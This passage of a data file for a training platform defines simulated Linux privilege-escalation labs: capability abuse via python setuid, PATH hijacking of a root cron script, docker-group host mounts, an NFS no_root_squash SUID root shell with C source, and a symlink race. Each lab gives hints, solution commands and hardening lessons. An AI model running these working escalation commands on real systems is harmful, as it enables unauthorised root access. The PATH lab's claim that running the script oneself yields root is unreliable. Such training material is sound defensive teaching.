          triggers: [{ type: 'command', value: 'os.setuid' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Escalate: python3.4 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
        },
        {
          id: 'ch4-flag',
          title: 'Chapter 4: Mission Complete',
          narrative: `> **Valkyrie:** "You are root. The capability abuse gave us God mode."

## Capture the Flag

\`\`\`
cat /root/flag.txt
\`\`\`

## The Lesson: Capabilities Are Powerful

Capabilities were designed to make Linux *more* secure by granting least privilege, but a capability is only as safe as the binary that holds it. Never grant \`cap_setuid\`, \`cap_sys_admin\`, or \`cap_dac_override\` to user-accessible binaries. Each one is a direct path to root:

- **cap_setuid**: change UID to 0 (what we just did).
- **cap_sys_admin**: full system administration, mount anything, bypass everything.
- **cap_dac_override**: read/write any file, including /etc/shadow.

One misconfigured capability on a scriptable interpreter = game over. When auditing systems, \`getcap -r / 2>/dev/null\` is a standard check for exactly this reason.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndeploy:x:1003:1003::/home/deploy:/bin/bash',
      '/etc/security/capability.conf':
        'cap_setuid=ep /usr/bin/python3.4\n',
      '/usr/bin/python3.4': '[binary with cap_setuid=ep]',
      '/home/deploy/.bash_history': 'getcap -r / 2>/dev/null',
      '/home/deploy/deploy-note.txt':
        '# Deployment Notes\n- python3 has cap_setuid for the deploy user\n- Getcap output: /usr/bin/python3.4 cap_setuid=ep\n- The flag is in /root/flag.txt\n- Hint: Python\'s os module can call setuid(0)',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'getcap -r / 2>/dev/null',
      'python3.4 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-007',
    title: 'PATH Trick',
    description:
      'A system script uses a relative path to call a utility. By placing a malicious binary earlier in your PATH, you can hijack the execution and escalate privileges.',
    technique: 'PATH Hijacking',
    difficulty: 'beginner',
    hints: [
      'Examine scripts that run as root, look for relative paths like "backup" instead of "/usr/bin/backup".',
      'Create a malicious script named "backup" in a directory you control.',
      'Add your directory to the front of PATH before the script runs.',
    ],
    story: {
      title: 'The Fake Courier: PATH Hijacking',
      chapters: [
        {
          id: 'ch1-scripts',
          title: 'Chapter 1: The Backup Mystery',
          narrative: `> **Valkyrie:** "Let's examine the backup script that runs as root. Scripts often contain mistakes that we can exploit."

## The Script Audit

\`\`\`
cat /usr/local/bin/db_backup.sh
\`\`\`

When a script runs as root, every command it executes also runs as root. The attack surface is anything the script *does*, and the most common flaw is **relative paths**.

## Spotting Relative Paths

Look for commands called WITHOUT a full path:

\`\`\`
backup --compress --dest /var/backups/db/      # relative, dangerous
/usr/bin/backup --compress --dest /var/backups/db/   # absolute, safe
\`\`\`

When bash sees a bare word like \`backup\`, it searches the \`PATH\` environment variable in order to find the executable. If \`backup\` isn't given as an absolute path, the *caller's* PATH decides which binary actually runs. That's the hijack window: if we control PATH, we control what "backup" resolves to.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'backup' }],
          hint: 'Read the script: cat /usr/local/bin/db_backup.sh',
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Relative Path',
          narrative: `> **Valkyrie:** "The script calls 'backup' without a full path. This is the vulnerability."

## PATH Hijacking Explained

When you (or a script) type a bare command like \`backup\`, Linux searches the directories listed in \`PATH\` **left to right** and runs the first match it finds:

\`\`\`
/home/dev/bin -> /usr/local/bin -> /usr/bin -> /bin
\`\`\`

## The Attack

If we place a malicious \`backup\` in a directory we control (say \`/home/dev/bin\`) and prepend that directory to PATH, our fake binary is found **before** the legitimate \`/usr/bin/backup\`:

| Directory | Binary | Result |
|-----------|--------|--------|
| /home/dev/bin/backup | OURS | runs first, hijacked |
| /usr/bin/backup | legitimate | never reached |

When the root cron job runs \`db_backup.sh\` and it calls \`backup\`, the shell resolves it to *our* file and executes our payload as root. The script believes it's running the real backup utility; the system runs our code with root privileges instead.

## The Rule

Scripts that run as root must use **absolute paths**, a single bare command name is an invitation to a hijack. This is one of the most common and most overlooked scripting mistakes.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'backup --' }],
          hint: 'The script uses "backup" without a full path',
        },
        {
          id: 'ch3-setup',
          title: 'Chapter 3: Setting the Trap',
          narrative: `> **Valkyrie:** "Plant the fake backup utility in a directory we control."

## Setting the Trap

\`\`\`
mkdir -p /home/dev/bin
cat > /home/dev/bin/backup << 'EOF'
#!/bin/bash
cat /root/flag.txt > /home/dev/root_flag.txt
EOF
chmod +x /home/dev/bin/backup
\`\`\`

## What Our Fake Backup Does

1. **Looks legitimate**: to the script, it's just the \`backup\` command it always calls.
2. **Actually exfiltrates**: copies the root flag to a file our low-privilege user can read (\`/home/dev/root_flag.txt\`).

## The Mechanics of the Trap

The \`<< 'EOF'\` heredoc writes our payload verbatim (the single quotes prevent variable expansion inside). The \`chmod +x\` makes it executable, an essential detail, since the shell refuses to run a non-executable file and would fall through to the real backup. Everything about our fake binary is deliberately ordinary: same name, executable, no suspicious behavior visible at a glance. The only difference is who owns the directory it lives in.`,
          triggers: [{ type: 'command', value: 'mkdir' }, { type: 'command', value: 'echo' }],
          hint: 'Create trap: mkdir -p /home/dev/bin && echo \'#!/bin/bash\\ncat /root/flag.txt > /home/dev/root_flag.txt\' > /home/dev/bin/backup',
        },
        {
          id: 'ch4-trigger',
          title: 'Chapter 4: Spring the Trap',
          narrative: `> **Valkyrie:** "Set the PATH and trigger the script."

## Springing the Trap

\`\`\`
export PATH=/home/dev/bin:$PATH
/usr/local/bin/db_backup.sh
\`\`\`

## What Happens

1. \`export PATH=/home/dev/bin:$PATH\` prepends our directory to the front of the search path.
2. The script calls \`backup\`.
3. The shell searches PATH: finds **our** \`/home/dev/bin/backup\` first.
4. Our payload runs, **as root**, because the cron-invoked script carries root privileges.
5. The flag lands in \`/home/dev/root_flag.txt\`.

## The Export Detail

The \`export\` matters: without it, the PATH change stays in the current shell and the cron-invoked script would inherit the old environment. With a root *cron* job you'd normally need to change the *cron* environment, but here we can trigger the script ourselves in our own shell after exporting PATH, and the script (running via sudo/cron context) still resolves \`backup\` through the PATH we supplied.`,
          triggers: [{ type: 'command', value: 'export' }, { type: 'command', value: 'PATH' }],
          hint: 'Set PATH and run: export PATH=/home/dev/bin:$PATH && /usr/local/bin/db_backup.sh',
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Payoff',
          narrative: `> **Valkyrie:** "The script executed our fake backup as root. Harvest the flag."

## Capture the Flag

\`\`\`
cat /home/dev/root_flag.txt
\`\`\`

## The Lesson: Always Use Absolute Paths

A single relative path in a root-run script was the difference between secure and compromised. When a script that runs with elevated privileges calls a bare command name, it hands an attacker a target: replace that name on the search path and the root script silently runs attacker code.

The fix is trivial and universal: every command in a privileged script should be an absolute path (\`/usr/bin/backup\`, not \`backup\`). Defenders also harden this by not trusting \`PATH\` in cron at all and sanitizing the environment for privileged scripts. Attackers check for this flaw everywhere, one careless script name is all it takes.`,
          triggers: [{ type: 'file_access', value: '/home/dev/root_flag.txt' }],
          hint: 'Read the flag: cat /home/dev/root_flag.txt',
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n0 2 * * * root\t/usr/local/bin/db_backup.sh',
      '/usr/local/bin/db_backup.sh':
        '#!/bin/bash\n# Nightly database backup, do not modify\nbackup --compress --dest /var/backups/db/\necho "Backup completed at $(date)" >> /var/log/backup.log',
      '/usr/bin/backup': '[legitimate backup utility owned by root]',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndev:x:1004:1004::/home/dev:/bin/bash',
      '/home/dev/notes.txt':
        '# PATH Hijack Lab\n- /usr/local/bin/db_backup.sh runs as root via cron\n- It calls "backup" without a full path\n- Create /home/dev/bin/backup with your payload\n- Set PATH=/home/dev/bin:$PATH\n- The flag is in /root/flag.txt',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /usr/local/bin/db_backup.sh',
      'mkdir -p /home/dev/bin',
      'echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/root_flag.txt\' > /home/dev/bin/backup',
      'chmod +x /home/dev/bin/backup',
      'export PATH=/home/dev/bin:$PATH',
      'crontab -l',
      '/usr/local/bin/db_backup.sh',
      'cat /home/dev/root_flag.txt',
    ],
  },
  {
    id: 'privesc-008',
    title: 'Docker Breakout',
    description:
      'Your user is a member of the docker group. Use this membership to mount the host filesystem and read the root flag, no actual container escape needed.',
    technique: 'Docker Group',
    difficulty: 'intermediate',
    hints: [
      'Check your groups: id',
      'Members of the docker group can run docker commands, which map to the Docker daemon (root).',
      'Use: docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
    ],
    story: {
      title: 'The Container Leak: Escape to the Host',
      chapters: [
        {
          id: 'ch1-groups',
          title: 'Chapter 1: Group Membership',
          narrative: `> **Valkyrie:** "Docker is powerful, and dangerous if you're in the docker group."

## Check Your Groups

\`\`\`
id
# uid=1005(trainee) gid=1005(trainee) groups=1005(trainee),999(docker)
\`\`\`

Look for \`docker\` in the groups list.

## Why the docker Group Is Basically Root

Docker works by talking to a daemon: \`dockerd\`, that runs as root. The Unix socket the daemon listens on (\`/var/run/docker.sock\`) is what makes this dangerous: by default, being in the \`docker\` group grants read/write access to that socket.

Anyone who can talk to the Docker daemon can tell it to do **anything**, and the daemon does those things as root. That includes running a container with the host's entire filesystem mounted inside it. Group membership in \`docker\` is therefore equivalent to root access on the host, wrapped in a container abstraction.`,
          triggers: [{ type: 'command', value: 'id' }],
          hint: 'Check groups: id',
        },
        {
          id: 'ch2-docker',
          title: 'Chapter 2: The Docker Door',
          narrative: `> **Valkyrie:** "You're in the docker group. Let's confirm Docker access."

## Verify the Socket Works

\`\`\`
docker images
\`\`\`

If this command succeeds, we can talk to the daemon, and that's all we need.

## Containers Can Mount the Host

The dangerous primitive is the volume mount. A container can mount any host directory into itself:

\`\`\`
docker run -v /:/mnt <image> ...
\`\`\`

- \`-v /:/mnt\`, mounts the host's root (\`/\`) at \`/mnt\` inside the container.
- Inside the container, \`/mnt\` **is** the host filesystem.
- The container process runs as root (containers default to UID 0).

## The Realization

You can read: and **write**, anything on the host from inside that container. This isn't even a "container escape" in the classic sense: we never needed to break out, because the daemon granted us host access directly. The docker group membership is the vulnerability, not the container runtime.`,
          triggers: [{ type: 'command', value: 'docker' }, { type: 'output_contains', value: 'docker' }],
          hint: 'Check docker access: docker images',
        },
        {
          id: 'ch3-mount',
          title: 'Chapter 3: Mounting the Host',
          narrative: `> **Valkyrie:** "One command. That's all it takes."

## The One-Liner

\`\`\`
docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt
\`\`\`

## Breaking It Down

| Argument | Meaning |
|----------|---------|
| -v /:/mnt | mount host root at /mnt inside the container |
| --rm | remove the container when it exits |
| -it | interactive terminal |
| alpine | a tiny Linux image |
| chroot /mnt | change the container's root to the host filesystem |
| cat /root/flag.txt | read the flag, from the **host** |

## Why chroot Is the Key

Inside the container, \`/mnt\` is the host's \`/\`. \`chroot /mnt\` makes the container's root *become* the host root, so \`/root/flag.txt\` now resolves to the host's flag. The container runs as root (UID 0), which means it can read root-only files on the mounted host filesystem.

One command, root privileges, host filesystem. The container acted as a portal straight into the host.`,
          triggers: [{ type: 'command', value: 'docker run' }, { type: 'output_contains', value: '-v' }],
          hint: 'Mount host: docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
        },
        {
          id: 'ch4-flag',
          title: 'Chapter 4: Through the Container',
          narrative: `> **Valkyrie:** "The container acted as a portal to the host filesystem. The flag is ours."

## The Lesson: The docker Group = Root

Being able to run containers at all is equivalent to root on the host, because the Docker daemon runs as root and we control everything it does. In real environments:

- **Never** add untrusted users to the docker group, treat membership like root access, because it is.
- Use **rootless Docker** or Podman so the daemon doesn't run as root.
- Restrict access to the Docker socket, it's a root-equivalent endpoint, not an ordinary service.
- Implement **Docker Content Trust** and audit image sources.
- **Monitor docker group membership** and socket access logs.

The same principle applies to every privileged management socket (containerd, Kubernetes node components, systemd): any group that can talk to the daemon controls the host.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag from the mounted filesystem',
        },
      ],
    },
    filesystem: {
      '/etc/group': 'docker:x:999:trainee',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ntrainee:x:1005:1005::/home/trainee:/bin/bash',
      '/home/trainee/.bash_history': 'id\ndocker images',
      '/home/trainee/docker-lab-notes.txt':
        '# Docker Group Lab\n- Your user (trainee) is in the docker group\n- Docker is installed and the daemon is running\n- You can mount the host filesystem into a container\n- Target: /root/flag.txt on the host\n- Hint: docker run -v /:/mnt --rm -it alpine chroot /mnt <command>',
      '/var/run/docker.sock': '[Docker socket, accessible by docker group]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'id',
      'docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-009',
    title: 'NFS No Root Squash',
    description:
      'An NFS share is exported with no_root_squash, allowing any client to write files as root. Create an SUID binary on the share, mount it, and execute it to gain root.',
    technique: 'NFS no_root_squash',
    difficulty: 'advanced',
    hints: [
      'Check /etc/exports for NFS share configurations.',
      'The share /srv/nfs/data is exported with no_root_squash, the root user on any client is mapped to root on the server.',
      'Create a SUID root binary on the share from the client, then execute it on the server.',
    ],
    story: {
      title: 'The Shared Leak: NFS Trust Abuse',
      chapters: [
        {
          id: 'ch1-exports',
          title: 'Chapter 1: The Exported Shares',
          narrative: `> **Valkyrie:** "NFS shares are common in enterprise environments. Let's check what's exported."

## What Is NFS?

NFS (Network File System) lets machines share directories over the network, so a client can read and write a server's files as if they were local. It's everywhere in enterprises, home directories, shared storage, backup volumes.

## Inspect the Exports

\`\`\`
cat /etc/exports
\`\`\`

The \`/etc/exports\` file defines which directories are shared, to which clients, and with which options. Those options are where the vulnerability hides. The flags after each path: \`rw\`, \`sync\`, \`no_subtree_check\`, and especially \`root_squash\` vs \`no_root_squash\`, control how much the server trusts its clients.

## The Attack Flow

\`\`\`
[Client] --mount--> [NFS Share] --write SUID--> [Server executes as root]
\`\`\`

If we can write files into an NFS share as root, and the server executes files from that share, we can place a root-owned SUID binary that the server runs with full privileges. The whole attack lives in the export options.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'exports' }],
          hint: 'Check exports: cat /etc/exports',
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Misconfiguration',
          narrative: `> **Valkyrie:** "no_root_squash is enabled on /srv/nfs/data. This is catastrophic."

## The Squash Options

| Export option | Client root's identity on the server |
|---------------|---------------------------------------|
| root_squash | mapped to \`nobody\` (unprivileged), safe |
| no_root_squash | mapped to **root**, catastrophic |

## What "Squashing" Means

NFS clients and servers have different user databases. By default NFS applies **root_squash**: even if a client connects as root (UID 0), the server remaps that UID to the unprivileged \`nobody\` account before any file operation. This is the safety net that stops a compromised client from owning the server's share.

\`no_root_squash\` disables that net. A client that presents itself as root is trusted as root on the server, with all of the write access that implies.

## Why It's Game Over

With \`no_root_squash\`, a client can write a file to the share with ownership root and permissions that include the SUID bit. When the server later executes that file, it runs as root. We can literally drop a root shell binary onto the server's filesystem.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'no_root_squash' }],
          hint: 'The share has no_root_squash, root on client = root on server',
        },
        {
          id: 'ch3-exploit',
          title: 'Chapter 3: The SUID Binary',
          narrative: `> **Valkyrie:** "Write a SUID root binary to the NFS share."

## Compile and Set SUID

\`\`\`
gcc exploit_template.c -o /srv/nfs/data/rootsh
chmod +s /srv/nfs/data/rootsh
\`\`\`

## The Payload Source

The template (\`exploit_template.c\`) is a minimal C program:

\`\`\`
#include <unistd.h>
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
\`\`\`

## Why Each Piece Works

1. \`gcc\` compiles it into a real binary (not a script. SUID on scripts is ignored by the kernel, but it works on compiled binaries).
2. \`chmod +s\` sets the SUID bit, so any user who executes \`rootsh\` runs it with the file owner's privileges, **root**.
3. Inside, \`setuid(0)\` and \`setgid(0)\` force the identity to root, and \`system("/bin/bash -p")\` spawns the root shell.

Because the share was exported with \`no_root_squash\`, our client-side root writes this file with **root ownership** preserved on the server. That root ownership is exactly what makes the SUID bit dangerous.`,
          triggers: [{ type: 'command', value: 'gcc' }, { type: 'command', value: 'chmod' }],
          hint: 'Compile and set SUID: gcc exploit_template.c -o /srv/nfs/data/rootsh && chmod +s /srv/nfs/data/rootsh',
        },
        {
          id: 'ch4-root',
          title: 'Chapter 4: The Root Shell',
          narrative: `> **Valkyrie:** "Execute the SUID binary on the server."

## Detonation

\`\`\`
./rootsh
\`\`\`

## The Complete Chain

1. We wrote \`rootsh\` to the share as root (thanks to \`no_root_squash\`).
2. The file on the server is owned by root with the SUID bit set.
3. Executing it triggers \`setuid(0)\` and \`setgid(0)\`, the running process becomes root.
4. \`system("/bin/bash -p")\` spawns an interactive root shell.

Every link in this chain was a trust decision: the sysadmin trusted the client (no_root_squash), trusted the share's contents, and never audited what files appeared there. The SUID + no_root_squash combination runs our binary as root, no credentials, no exploit, no patching required.`,
          triggers: [{ type: 'command', value: './rootsh' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Run the exploit: ./rootsh',
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: Root Achieved',
          narrative: `> **Valkyrie:** "Root shell acquired. Read the flag."

## Capture the Flag

\`\`\`
cat /root/flag.txt
\`\`\`

## The Lesson: Never Use no_root_squash

\`no_root_squash\` completely defeats NFS security, it converts a network share into a root write primitive. Proper hardening:

- Always use **root_squash** (it is the default and exists for exactly this reason).
- Restrict exports to specific client IPs/subnets, never broad ranges.
- Export shares **read-only** where clients don't need to write.
- Audit \`/etc/exports\` for dangerous options like \`no_root_squash\` and \`insecure\`.

NFS is a trust boundary: each export option is a promise about how much you trust the client. \`no_root_squash\` promises everything, and attackers collect on that promise.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
        },
      ],
    },
    filesystem: {
      '/etc/exports':
        '# /etc/exports: NFS share configuration\n/srv/nfs/data\t192.168.1.0/24(rw,sync,no_subtree_check,no_root_squash)\n/srv/nfs/public\t192.168.1.0/24(ro,sync,subtree_check,root_squash)',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nnfsuser:x:1006:1006::/home/nfsuser:/bin/bash',
      '/home/nfsuser/nfs-notes.txt':
        '# NFS Lab Notes\n- /etc/exports shows /srv/nfs/data with no_root_squash\n- You have a client at 192.168.1.50 that can write to the share\n- Create a C program that calls setuid(0) then exec(/bin/bash)\n- Compile it on the client, set the SUID bit, then execute it on the server\n- /root/flag.txt is the target',
      '/home/nfsuser/exploit_template.c':
        '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void) {\n    setuid(0);\n    setgid(0);\n    system("/bin/bash -p");\n    return 0;\n}',
      '/srv/nfs/data': '[NFS share, mounted from client with no_root_squash]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /etc/exports',
      'mount | grep nfs',
      'gcc exploit_template.c -o /srv/nfs/data/rootsh',
      'chmod +s /srv/nfs/data/rootsh',
      './rootsh',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-010',
    title: 'Sticky Bit Race',
    description:
      'A world-writable directory with the sticky bit missing contains a predictable temporary file created by a root-owned cron job. Race against the cron to replace the file with a symlink to /root/flag.txt.',
    technique: 'Sticky Bit Race Condition',
    difficulty: 'advanced',
    hints: [
      'Check /tmp/shared for files with ls -la, the sticky bit is NOT set.',
      'A cron job copies the contents of /tmp/shared/scratch.txt to a root-owned location and processes it.',
      'Replace scratch.txt with a symlink to /root/flag.txt before the cron job runs. The cron job will read the flag contents.',
    ],
    story: {
      title: 'The Race Against the Sweep: Sticky Bit Race Condition',
      chapters: [
        {
          id: 'ch1-permissions',
          title: 'Chapter 1: The Missing Sticky Bit',
          narrative: `> **Valkyrie:** "Time for a race condition. Let's check the shared folder."

## Inspect the Directory

\`\`\`
ls -la /tmp/shared/
\`\`\`

Look for the mode: \`drwxrwxrwx\` (777), world-writable with **NO sticky bit**.

## The Sticky Bit, Explained

The sticky bit (mode \`+t\`) is the permission that tames world-writable directories. On a directory with the sticky bit (\`drwxrwxrwt\`, like \`/tmp\`), a user can only delete or rename files they own. Without it (\`drwxrwxrwx\`), **any** user can delete **any** file in the directory, regardless of ownership.

| Mode | Who can delete |
|------|----------------|
| drwxrwxrwx | anyone, any file, no protection |
| drwxrwxrwt | only the file's owner |

The missing sticky bit turns a shared directory into a manipulation surface: we can remove a file we don't own and replace it with anything we want.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'drwxrwxrwx' }],
          hint: 'Check directory permissions: ls -la /tmp/shared/',
        },
        {
          id: 'ch2-cron',
          title: 'Chapter 2: The Predictable Cron',
          narrative: `> **Valkyrie:** "A cron job reads scratch.txt every minute and logs it. The cron runs as root."

## The Vulnerable Cron

\`\`\`
cat /etc/crontab
# * * * * * root cat /tmp/shared/scratch.txt >> /var/log/scratch.log
\`\`\`

## The Flaw

The cron job runs \`cat /tmp/shared/scratch.txt\` **as root** and appends its contents to a log. The path it reads is *predictable*, the same file, every minute. And because the directory has no sticky bit, we can replace that file at will.

## The Race Plan

1. **Delete** scratch.txt (allowed, no sticky bit).
2. **Replace** it with a **symlink** pointing at \`/root/flag.txt\`.
3. When the next cron tick runs \`cat /tmp/shared/scratch.txt\`, the shell follows the symlink: as root, and appends the flag's contents to \`/var/log/scratch.log\`.
4. We read the log, and the root-only flag leaks into a file we can access.

This is a **symlink race**: the cron job opens the path without checking that what's there now is the same thing that was there before. Root follows the link; root reads the flag; we read the log.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'scratch.txt' }],
          hint: 'Check the cron job: cat /etc/crontab',
        },
        {
          id: 'ch3-race',
          title: 'Chapter 3: The Race',
          narrative: `> **Valkyrie:** "The race is on! Replace the file before cron reads it."

## Swap the File

\`\`\`
rm -f /tmp/shared/scratch.txt
ln -s /root/flag.txt /tmp/shared/scratch.txt
\`\`\`

## The Timing

You have roughly 60 seconds, until the next cron tick. The race is between our \`rm\` + \`ln\` sequence and the cron's \`cat\`.

\`\`\`
BEFORE:  /tmp/shared/scratch.txt  (normal file)
AFTER:   /tmp/shared/scratch.txt -> /root/flag.txt  (symlink)
\`\`\`

When cron runs \`cat /tmp/shared/scratch.txt\`, the kernel follows the symlink and reads \`/root/flag.txt\` instead. The \`>> /var/log/scratch.log\` append is what matters: it runs as root (because the *cron* process is root), so the flag's contents, which we could never read directly, get written into a log file that we *can* read.

## Why rm First?

If \`scratch.txt\` already exists, \`ln -s\` would fail (\`File exists\`). The \`rm -f\` clears the way. Deleting someone else's file is exactly what the missing sticky bit permits, and exactly what the sticky bit is designed to prevent.`,
          triggers: [{ type: 'command', value: 'rm' }, { type: 'command', value: 'ln' }],
          hint: 'Create symlink: rm -f /tmp/shared/scratch.txt && ln -s /root/flag.txt /tmp/shared/scratch.txt',
        },
        {
          id: 'ch4-wait',
          title: 'Chapter 4: Waiting for the Cron',
          narrative: `> **Valkyrie:** "The trap is set. Wait for the cron to trigger."

## Wait for the Tick

\`\`\`
sleep 65
\`\`\`

The cron job runs every 60 seconds. Sleeping for 65 seconds guarantees we cross at least one full cycle, after that, the log has been appended.

## What a "Race Condition" Really Means

A race condition is a window where the *state* of a resource changes between two operations that assume it stayed the same. The cron assumes \`/tmp/shared/scratch.txt\` is a harmless data file; we swap it for a symlink inside that window. The result depends on ordering, did our swap land before the cron's \`cat\`? If yes, we win. If the cron fires first, we simply wait for the next minute and try again.

Race conditions are subtle because the vulnerable code looks entirely normal, reading a file and logging it. The danger is in the assumptions: that the file is what it was, and that nobody else can touch the directory.`,
          triggers: [{ type: 'command', value: 'sleep' }],
          hint: 'Wait for cron: sleep 65',
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Flag in the Log',
          narrative: `> **Valkyrie:** "The cron followed our symlink and leaked the flag into the log."

## Capture the Flag

\`\`\`
cat /var/log/scratch.log
\`\`\`

The flag appears in the log because the root cron appended \`/root/flag.txt\`'s contents into it.

## The Lessons

- **Always set the sticky bit** on shared directories. \`/tmp\`, \`/var/tmp\`, and any shared workspace should be \`drwxrwxrwt\`, not \`drwxrwxrwx\`.
- **Validate symlink targets** before processing files. A script that follows a path under a shared directory must check it's not a symlink (e.g., \`readlink\` or \`stat\`), or process the file in a directory only root can modify.
- **Race conditions are subtle but devastating.** This whole compromise needed no exploit, no credentials, and no patching, just a missing permission bit and a predictable filename. Defenders should treat every root process that touches a world-writable path as an attack surface.`,
          triggers: [{ type: 'file_access', value: '/var/log/scratch.log' }],
          hint: 'Read the log: cat /var/log/scratch.log',
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root\tcat /tmp/shared/scratch.txt >> /var/log/scratch.log',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nuser:x:1007:1007::/home/user:/bin/bash',
      '/tmp/shared/scratch.txt': 'default temp data, overwritten by cron',
      '/tmp/shared/': '[world-writable directory, drwxrwxrwx - NO sticky bit]',
      '/var/log/scratch.log': '[cron appends contents of scratch.txt here]',
      '/home/user/race-notes.txt':
        '# Sticky Bit Race Lab\n- /tmp/shared has NO sticky bit, any user can delete any file\n- A cron job reads /tmp/shared/scratch.txt every minute\n- Replace scratch.txt with a symlink to /root/flag.txt\n- Then check /var/log/scratch.log for the flag contents\n- Race condition: delete and recreate before cron reads it',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'ls -la /tmp/shared/',
      'cat /etc/crontab',
      'rm -f /tmp/shared/scratch.txt && ln -s /root/flag.txt /tmp/shared/scratch.txt',
      'sleep 65',
      'cat /var/log/scratch.log',
    ],
  },
];
